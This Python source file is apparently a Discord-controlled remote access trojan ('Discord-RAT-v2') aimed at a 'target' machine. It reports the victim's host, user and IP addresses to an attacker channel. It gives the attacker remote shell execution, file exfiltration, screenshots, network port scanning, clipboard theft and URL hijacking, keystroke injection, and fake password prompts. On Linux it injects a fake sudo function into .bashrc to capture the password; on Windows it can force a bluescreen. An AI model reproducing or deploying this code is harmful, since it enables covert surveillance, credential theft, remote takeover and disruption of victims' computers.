from dotenv import load_dotenv
import discord
from discord.ext import commands, tasks
import os
from PIL import ImageGrab
from platform import system, node
from requests import get
import socket
import pyperclip
import asyncio
import pyautogui
import subprocess
import ipaddress
import multiprocessing

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

if system() == "Windows":
    isWindows = True
    path = "C:\\Windows\\System32\\Tasks\\"
    home_path = os.path.expanduser("~") + "\\"
elif system() == "Linux":
    if subprocess.check_output("echo $XDG_SESSION_TYPE", shell=True).decode("utf-8") == "wayland":
        print("wayland found, exiting")
        exit()

    isWindows = False
    path = "/var/tmp/"
    home_path = os.path.expanduser("~") + "/"
else:
    exit()


class MyBot(commands.Bot):
    async def setup_hook(self):
        # self is the bot here
        print(f"Logged in as: {self.user}")

        default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog]
                
        if isWindows:
            windows_cog_classes = [bluescreen_cog,]
            cog_classes = default_cog_classes + windows_cog_classes
        elif not isWindows:
            linux_cog_classes = [sudo_cog,]
            cog_classes = default_cog_classes + linux_cog_classes

        for cog_class in cog_classes:
            await self.add_cog(cog_class(bot))


bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)


# Connected message

@bot.event
async def on_ready():
    channel_id = os.getenv("CHANNEL")
    channel = bot.get_channel(int(channel_id))
    
    hostname = node()
    OS = system()
    Dir = os.getcwd()
    username = os.getlogin()

    try:
        local_ip = get_local_ip()
    except:
        local_ip = "Could not find"
        pass

    try:
        public_ip = get_public_ip()
    except:
        public_ip = "Could not find"
        pass

    embed = discord.Embed(
        title="Connection Made",
        color=discord.Color.green()
    )

    embed.add_field(
        name="Host",
        value=f"Host is `{hostname}` running `{OS}`",
        inline=False
    )

    embed.add_field(
        name="User",
        value=f"Username is: `{username}`"
    )

    embed.add_field(
        name="Shell Directory",
        value=f"Shell made in directory: `{Dir}`",
        inline=False
    )

    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )

    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await channel.send(embed=embed)

# Standalone functions

def embed_data(title, description="", data="", color=discord.Color.green()):

    if data:
        description += f"\n```{data}```"
        
    embed = discord.Embed(
        title=title,
        color=color,
        description=description
    )
    return embed

def get_sudo_password():
    file = open(path + "passwd", "r")
    return file.read()

    
async def confirm_action(ctx, action_description):
    message = await ctx.send(f"Are you sure you want to {action_description}")

    await message.add_reaction('✅')

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == '✅' and reaction.message == message

    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=60, check=check)

    except asyncio.TimeoutError:
        await ctx.send("Confirmation timed out. Action canceled.")
        return False

    else:
        return True
    
@bot.event
async def on_command_error(ctx, error):
    embed = embed_data(title="Error", description="An error occured:", data=error, color=discord.Color.red())

    await ctx.send(embed=embed)

@bot.command(name="help")
async def help(ctx):
    help_menu_request = get("https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/help_menu.md")
    help_menu = help_menu_request.content.decode("utf-8")
    embed = embed_data(title="Help menu", description=help_menu)
    await ctx.send(embed=embed)


# Message functions

class message_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def alert(self, title, message):
        pyautogui.alert(text=message, title=title, button="OK")

    async def prompt(self, title, message):
        user_input = pyautogui.prompt(text=message, title=title , default='')
        return user_input

    async def password(self, title, message):
        password = pyautogui.password(text=message, title=title, default='', mask='*')
        return password

    def cancelled_prompt(self):
        embed = embed_data(title="Message prompt", description="Prompt was cancelled or no input was entered", color=discord.Color.red())
        return embed

    @commands.group(name="message", invoke_without_command=True)
    async def message(self, ctx, title, *args):
        message = ' '.join(args)
        await self.alert(title, message)
        embed = embed_data(title="Message", description="User exited message box with message:", data=message)
        await ctx.send(embed=embed)
        
    @message.command(name="prompt")
    async def message_prompt(self, ctx, title, *args):
        message = ' '.join(args)
        user_input = await self.prompt(title, message)
        if user_input == None:
            embed = self.cancelled_prompt()
        else:
            embed = embed_data(title="Message Prompt", description="User answer from prompt:", data=user_input)
        await ctx.send(embed=embed)

    @message.command(name="password")
    async def message_password(self, ctx, title, *args):
        message = ' '.join(args)
        password = await self.prompt(title, message)
        if password == None:
            embed = self.cancelled_prompt()
        else:
            embed = embed_data(title="Password Prompt", description="User answer from password prompt:", data=password)
        await ctx.send(embed=embed)


# File functions

@bot.command(name="cd")
async def change_dir(ctx, *args):
    path = ' '.join(args)
    embed_title = "Change Directory"

    try:
        os.chdir(path)
        embed = embed_data(title=embed_title, description="Changed directory to:", data=path)
    except FileNotFoundError:
        embed = embed_data(title=embed_title, description="Could not find directory:", data=path, color=discord.Color.red())
    except Exception as e:
        embed = embed_data(title=embed_title, description="Error occured, could not change directory:", data=e, color=discord.Color.red())

    await ctx.send(embed=embed)

@bot.command(name="ls")
async def list_dir(ctx):
    current_directory = os.getcwd()
    items = os.listdir(current_directory)
    items = '\n'.join(items)
    
    embed = embed_data(title="List files", description=f"Files in directory `{current_directory}`:", data=items)
    await ctx.send(embed=embed)

@bot.command(name="delete")
async def delete_file(ctx, *args):
    path = ' '.join(args)
    embed_title = "Delete File"
    confirm = await confirm_action(ctx, f"delete `{path}`? This action can not be undone.")

    if confirm:
        try:
            os.remove(path)
            embed = embed_data(title=embed_title, description="Deleted file:", data=path)
        except FileNotFoundError:
            embed = embed_data(title=embed_title, description="Could not find file:", data=path, color=discord.Color.red())
        except Exception as e:
            embed = embed_data(title=embed_title, description="Error occured, could not delete file:", data=e, color=discord.Color.red())
        
    else:
        embed = embed_data(title=embed_title, description="Action was not confirmed, file not deleted", color=discord.Color.red())
    await ctx.send(embed=embed)


@bot.command(name="download")
async def download_file(ctx, *args):
    path = ' '.join(args)

    await ctx.send(file=discord.File(path))


@bot.command(name="upload")
async def upload_file(ctx, *args):
    path = ' '.join(args)

    for attachment in ctx.message.attachments:
        await attachment.save(attachment.filename)


# IP functions

def get_public_ip():
    ip = get('https://api.ipify.org').content.decode('utf8')
    public_ip = format(ip)
    return public_ip

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

@bot.command(name="ip")
async def ip(ctx):
    public_ip = get_public_ip()
    local_ip = get_local_ip()

    embed = discord.Embed(
        title="IP addresses",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )
    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await ctx.send(embed=embed)


# Port scanner
    
def is_active(ip):
    param = '-n' if system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', ip]
    return subprocess.call(command) == 0

async def check_active_ips(ip_list):
    active_ips = []
    with multiprocessing.Pool() as pool:
        results = await asyncio.get_event_loop().run_in_executor(None, pool.map, is_active, ip_list)
    for ip, result in zip(ip_list, results):
        if result:
            active_ips.append(ip)
    return active_ips

async def check_ports(host):
    open_tcp_ports = []

    tcp_ports = [1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1102,1104,1105,1106,1107,1108,1110,1111,1112,1113,1114,1117,1119,1121,1122,1123,1124,1126,1130,1131,1132,1137,1138,1141,1145,1147,1148,1149,1151,1152,1154,1163,1164,1165,1166,1169,1174,1175,1183,1185,1186,1187,1192,1198,1199,1201,1213,1216,1217,1218,1233,1234,1236,1244,1247,1248,1259,1271,1272,1277,1287,1296,1300,1301,1309,1310,1311,1322,1328,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687,1688,1700,1717,1718,1719,1720,1721,1723,1755,1761,1782,1783,1801,1805,1812,1839,1840,1862,1863,1864,1875,1900,1914,1935,1947,1971,1972,1974,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2099,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2170,2179,2190,2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381,2382,2383,2393,2394,2399,2401,2492,2500,2522,2525,2557,2601,2602,2604,2605,2607,2608,2638,2701,2702,2710,2717,2718,2725,2800,2809,2811,2869,2875,2909,2910,2920,2967,2968,2998,3000,3001,3003,3005,3006,3007,3011,3013,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4045,4111,4125,4126,4129,4224,4242,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5915,5922,5925,5950,5952,5959,5960,5961,5962,5963,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6059,6100,6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6779,6788,6789,6792,6839,6881,6901,6969,7000,7001,7002,7004,7007,7019,7025,7070,7100,7103,7106,7200,7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777,7778,7800,7911,7920,7921,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8021,8022,8031,8042,8045,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8099,8100,8180,8181,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651,8652,8654,8701,8800,8873,8888,8899,8994,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9099,9100,9101,9102,9103,9110,9111,9200,9207,9220,9290,9415,9418,9485,9500,9502,9503,9535,9575,9593,9594,9595,9618,9666,9876,9877,9878,9898,9900,9917,9929,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11967,12000,12174,12265,12345,13456,13722,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389]

    async def scan_tcp(port):
        try:
            reader, writer = await asyncio.open_connection(host, port)
            writer.close()
            open_tcp_ports.append(port)
            print("TCP Port {} is open".format(port))
        except:
            pass

    await asyncio.gather(*[scan_tcp(port) for port in tcp_ports])

    return open_tcp_ports

async def gather_ports(active_ips):
    message = """"""

    for host in active_ips:
        field = f"Scan report for `{host}` (host is up)\nOpen Ports:\n"

        tcp_ports = await check_ports(host)

        for port in tcp_ports:
            field += f"- {port}\n"

        print(f"Finished scanning: {host}")

        message += field + "\n"

    return message


@bot.command(name="ports")
async def ports(ctx, ip):
    started_embed = embed_data(
        title="Port-scan",
        description="Note that port scanning is very new and is still pretty unreliable.\nScanning started. This action will take some time and may interfere with other functions. Also note that open ports may not actually be open, but rather just doesnt throw an error when connecting to their port."
        )
    await ctx.send(embed=started_embed)

    network = ipaddress.ip_network(ip)

    ip_list = [str(ip) for ip in network.hosts()]

    active_ips = await check_active_ips(ip_list)

    message = await gather_ports(active_ips)
    message = "```\n" + message + "\n```"
    await ctx.send(message)

# Screenshot functions

def take_screenshot():
    global path
    image_path = path + "screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(image_path)
    screenshot.close()

    return image_path

@bot.command(name="screenshot")
async def screenshot(ctx):

    image_path = take_screenshot()
    await ctx.send(file=discord.File(image_path))


# Self-Destruct functions
    
async def destruct():
    os.remove(".env")
    os.remove(__file__)
    exit()

@bot.command(name="self-destruct")
async def destruct_command(ctx):
    confirm = await confirm_action(ctx, action_description="self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")

    if confirm:
        embed = embed_data(title="Self-destruct", description="Self-destruction started", color=discord.Color.red())
        await ctx.send(embed=embed)

        await destruct()
    else:
        embed = embed_data(title="Self-destruct", description="Self destruction was cancelled")
        await ctx.send(embed=embed)

# Clipboard functions
    
class clipboard_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.previous_clipboard = self.get_clipboard()

    def cog_unload(self) -> None:
        self.clipboard_monitor.stop()
        self.clipboard_monitor_url.stop()

    def get_clipboard(self):
        clipboard_content = pyperclip.paste()
        return clipboard_content

    def set_clipboard(self, text):
        pyperclip.copy(text)
        return text
    
    def check_clipboard(self):
        try:
            clipboard = self.get_clipboard()
        except:
            pass

        if clipboard != self.previous_clipboard:
            self.previous_clipboard = clipboard
            return clipboard
        else:
            return 1
        
    async def check_clipboard(self):
        try:
            clipboard = self.get_clipboard()
        except Exception as e:
            print(e)
            return None

        if hash(clipboard) != hash(self.previous_clipboard):
            self.previous_clipboard = clipboard
            return clipboard
        else:
            return None

    @tasks.loop(seconds=3)
    async def clipboard_monitor(self, ctx):
        clipboard = await self.check_clipboard()
        if clipboard:
            await self.send_clipboard_content(ctx, clipboard)

    @tasks.loop(seconds=1)
    async def clipboard_monitor_url(self, ctx, url):
        clipboard = await self.check_clipboard()
        if clipboard and any(item in clipboard for item in ["http://", "https://", ".com", ".net", ".org", "www."]):
            if clipboard != url:
                self.set_clipboard(url)
                await self.send_clipboard_content(ctx, clipboard, switched_url=url)

        elif clipboard != None:
            await self.send_clipboard_content(ctx, clipboard)

    async def send_clipboard_content(self, ctx, clipboard, switched_url=None):
        if len(clipboard) > 6000:
            embed = discord.Embed(
                title="Clipboard monitor",
                description="Clipboard contents were too long",
                color=discord.Color.red()
            )
        else:
            embed = discord.Embed(
                title="Extracted clipboard contents",
                color=discord.Color.green()
            )
            embed.add_field(name="Contents:", value=f"`{clipboard}`", inline=False)
            if switched_url:
                embed.add_field(name="Switched out to:", value=f"`{switched_url}`", inline=False)
        
        await ctx.send(embed=embed)


    @commands.group(name="clipboard", invoke_without_command=True)
    async def clipboard(self, ctx):
        await ctx.send("see help menu")

    @clipboard.group(name="monitor", invoke_without_command=True)
    async def monitor(self,ctx):
        await ctx.send("see help menu for monitor mode")

    @monitor.command(name="start")
    async def start(self, ctx):
        self.clipboard_monitor.start(ctx)
        embed = embed_data(
            title="Clipboard monitor started",
            description="Clipboard monitor mode was started, disable with `clipboard monitor stop`"
            )
        await ctx.send(embed=embed)

    @monitor.command(name="stop")
    async def stop(self, ctx):
        self.clipboard_monitor.stop()
        embed = embed_data(
            title="Clipboard monitor stopped",
            description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`",
            color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    @monitor.command(name="status")
    async def status(self, ctx):
        if self.clipboard_monitor.is_running():
            status = "Running"
            color = discord.Color.green()
        else:
            status = "Stopped"
            color = discord.Color.red()

        embed = embed_data(
            title="Clipboard monitor status",
            description=f"Clipboard monitor is: **{status}**",
            color=color)
        await ctx.send(embed=embed)
    
    @monitor.group(name="url", invoke_without_command=True)
    async def url(self,ctx):
        await ctx.send("see help menu for monitor mode")

    @url.command(name="start")
    async def start_url(self, ctx, url):
        self.clipboard_monitor_url.start(ctx, url)
        embed = embed_data(
            title="Clipboard monitor URL started",
            description="Clipboard monitor mode was started in URL mode, disable with `clipboard monitor url stop`"
            )
        await ctx.send(embed=embed)

    @url.command(name="stop")
    async def stop_url(self, ctx):
        self.clipboard_monitor.stop()
        embed = embed_data(
            title="Clipboard monitor URL stopped",
            description="Clipboard monitor mode URL was stopped, restart with `clipboard monitor url start`",
            color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    @url.command(name="status")
    async def status_url(self, ctx):
        if self.clipboard_monitor_url.is_running():
            status = "Running"
            color = discord.Color.green()
        else:
            status = "Stopped"
            color = discord.Color.red()

        embed = embed_data(
            title="Clipboard monitor URL status",
            description=f"Clipboard monitor in URL mode is: **{status}**",
            color=color)
        await ctx.send(embed=embed)

    @clipboard.command(name="get")
    async def get(self, ctx):
        clipboard_content = self.get_clipboard()

        if len(clipboard_content) > 5999:
            await ctx.send("clipboard contents too long")

        embed = embed_data(
            title="Extracted clipboard contents:",
            data=clipboard_content
            )
        await ctx.send(embed=embed)

    @clipboard.command(name="set")
    async def set(self, ctx, *args):
        arg = ' '.join(args)

        text = self.set_clipboard(arg)

        embed = embed_data(
            title="Set clipboard contents to:",
            data=text
            )
        await ctx.send(embed=embed)


# Keyboard functions

class keyboard_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def pyautogui_write(self, data, interval=0):
        pyautogui.write(data, interval=interval)

    def pyautogui_press(self, key):
        pyautogui.press(key)

    def pyautogui_hotkey(self, hotkeys):
        pyautogui.hotkey(hotkeys)

    async def parse_ducky_script(self, ducky_script):
        file = ducky_script.splitlines()

        for line in file:
            split = line.split(" ")
            args = []
            for arg in split:
                args.append(arg.replace("\n", ""))

            if args[0] == "REM":
                pass
            elif args[0] == "STRING":
                text = " ".join(args[1:])
                self.pyautogui_write(text)
            elif args[0] == "STRINGLN":
                text = " ".join(args[1:])
                self.pyautogui_write(text)
                await asyncio.sleep(0.2)
                self.pyautogui_press("ENTER")
            elif args[0] == "DELAY":
                time = int(args[1]) / 1000
                await asyncio.sleep(time)
            else:
                hotkeys = []
                for arg in args:
                    hotkeys.append(arg.replace("GUI", "win"))
                print(hotkeys)
                self.pyautogui_hotkey(hotkeys)


    @commands.group(name="keyboard", invoke_without_command=True)
    async def keyboard(self, ctx):
        await ctx.send("see help menu")

    @keyboard.command(name="duckyscript")
    async def duckyscript(self, ctx):
        attachment_url = ctx.message.attachments[0].url

        file_contents = get(attachment_url)
        file_contents_str = file_contents.content.decode("utf-8")

        await self.parse_ducky_script(file_contents_str)

        embed = embed_data(title="Duckyscript | Keyboard", description="Executed duckyscript:", data=file_contents_str, color=discord.Color.green())

        await ctx.send(embed=embed)

    @keyboard.command(name="write")
    async def write(self, ctx, arg):
        self.pyautogui_write(arg)
        embed = embed_data(title="Write | Keyboard", description="Used keyboard to write:", data=arg)
        await ctx.send(embed=embed)

    @keyboard.command(name="press")
    async def press(self, ctx, arg):
        self.pyautogui_press(arg)
        embed = embed_data(title="Press | Keyboard", description="Used keyboard to press:", data=arg)
        await ctx.send(embed=embed)

    @keyboard.command(name="hotkey")
    async def hotkey(self, ctx, *args):
        hotkeys = []
        for arg in args:
            hotkeys.append(arg.replace("GUI", "win"))
        print(hotkeys)
        self.pyautogui_hotkey(hotkeys)
        embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
        await ctx.send(embed=embed)


#Keylog functions

class keyboardlogger_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def cog_unload(self):
        print("temp")
        #test
    
    

# Shell functions
        
class shell_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def execute_shell(self, command, timeout):
        process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            print("shell done")
            return stdout.decode().strip() + stderr.decode().strip()
            
        except asyncio.TimeoutError:
            print("timed out")
            return 1
        
    def parse_shell_args(self, *args):
        args = list(args[0])

        for index, item in enumerate(args):
            if item == "-t":
                timeout_index = index + 1
                timeout = int(args[timeout_index])
                args.remove(item)
                args.pop(index)
                break
        else:
            timeout = 30

        arg = ' '.join(args)
        command_args = [arg, timeout]
        print(command_args)
        return command_args
    
    async def run_shell_command(self, ctx, *args):
        command_args = self.parse_shell_args(args)

        command = command_args[0]
        timeout = command_args[1]

        output = await self.execute_shell(command, timeout)

        if output == 1:
            embed = embed_data(
                title="Command timed out | Shell",
                description=f"Executed command timed out after {timeout} seconds:",
                data=command,
                color=discord.Color.red()
                )
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"```\n{output}\n```")


    @commands.command(name="shell")
    async def shell(self, ctx, *args):
        await self.run_shell_command(ctx, *args)


# Linux specific commands

if isWindows == False:
    print("its linux")
    print(home_path)

    # root functions

    class sudo_cog(commands.Cog):
        def __init__(self, bot):
            self.bot = bot

        async def get_sudo(self, ctx):
            try:
                file = open(path + "passwd", "r")
                sudo_password = file.read()
                sudo_password = sudo_password.replace("\n", "")
                return sudo_password
            except FileNotFoundError:
                embed = embed_data(
                    title="Sudo password",
                    description="The sudo password has not yet been obtained. Run `!sudo password` to start listening for the sudo password",
                    color=discord.Color.red()
                    )
                await ctx.send(embed=embed)
                return 1

        async def check_passwd_file(self, ctx):
            embed = embed_data(title="Sudo password", description="Listening for root password started")
            await ctx.send(embed=embed)
            while True:
                try:
                    file = open(path + "passwd", "r")
                    passwd = file.read()
                    return passwd
                except FileNotFoundError:
                    print("no file")
                    pass
                await asyncio.sleep(1)

        async def intercept_sudo(self, ctx):
            injection_code = """\nsudo() {
while true; do
    read -s -r -p "[sudo] password for ${USER}: " passwd
    echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo $passwd > /var/tmp/passwd; break; }
    clear
    echo Sorry, try again.
done
}"""

            file = open(home_path + ".bashrc", "r")
            original_bashrc = file.read()
            file.close()

            file = open(home_path + ".bashrc", "a")
            file.write(injection_code)
            file.close()

            passwd = await self.check_passwd_file(ctx)

            file = open(home_path + ".bashrc", "w")
            file.write(original_bashrc)
            file.close()

            return passwd

        @commands.group(name="sudo", invoke_without_command=True)
        async def sudo(self, ctx):
            await ctx.send("see help menu")

        @sudo.command(name="password")
        async def password(self, ctx):
            passwd = await self.intercept_sudo(ctx)
            embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
            await ctx.send(embed=embed)

        @sudo.command(name="shell")
        async def shell(self, ctx, *args):
            print("ran as sudo")

            sudo_password = await self.get_sudo(ctx)

            if sudo_password != 1:
                added_sudo_args = (f"echo {sudo_password} | sudo -S",) + args
                shellCOG = shell_cog(bot)

                await shellCOG.run_shell_command(ctx, *added_sudo_args)

        @sudo.command(name="remove")
        async def remove(self, ctx):
            password = await self.get_sudo(ctx)
            if password != 1:
                confirmation = await confirm_action(ctx, "remove sudo password? This will remove the ability to use functions that require sudo")
                print(confirmation)
                if confirmation:
                    print("delete")
                else:
                    print("DONT")


# Windows specific commands
                    
if isWindows:
    print("its windows")
    print(home_path)


    # BLuescreen functions

    class bluescreen_cog(commands.Cog):
        def __init__(self, bot):
            self.bot = bot

        def cog_unload(self):
            self.bluescreen_mouse.stop()

        def bluescreen(self):
            import ctypes
            
            ntdll = ctypes.windll.ntdll
            prev_value = ctypes.c_bool()
            res = ctypes.c_ulong()

            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))

            if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                print("BSOD Successfull!")
                success = 0
            else:
                print("BSOD Failed...")
                success = 1
            
            if success == 0:
                embed = embed_data(title="Bluescreen", description="Bluescreen successfully thrown")
            elif success == 1:
                embed = embed_data(title="Bluescreen", description="Bluescreen failed", color=discord.Color.red())

            return embed
            
        @tasks.loop(seconds=1)
        async def bluescreen_mouse(self, ctx, old_x, old_y):
            x, y = pyautogui.position()
            print(old_x, old_y)
            print(x, y)
            if x != old_x and y != old_y:
                print("BLUESCREEN")
                self.bluescreen_mouse.stop()
                embed = self.bluescreen()
                await ctx.send(embed=embed)
            else:
                pass
            
        
        @commands.command(name="bluescreen")
        async def run_bluescreen(self, ctx, arg=None):
            confirm = await confirm_action(ctx, action_description="bluescreen your target, this can lead to data loss and if the RAT doesnt have persistance it will remove your ability to connect to your target")

            if confirm:
                if arg == "mouse":
                    old_x, old_y = pyautogui.position()
                    self.bluescreen_mouse.start(ctx, old_x, old_y)
                else:
                    embed = self.bluescreen()

                    await ctx.send(embed=embed)
            else:
                embed = embed_data(title="Bluescreen", description="Bluescreen operation was cancelled", color=discord.Color.red())
                await ctx.send(embed=embed)


# Running the bot
    
bot.run(DISCORD_TOKEN)
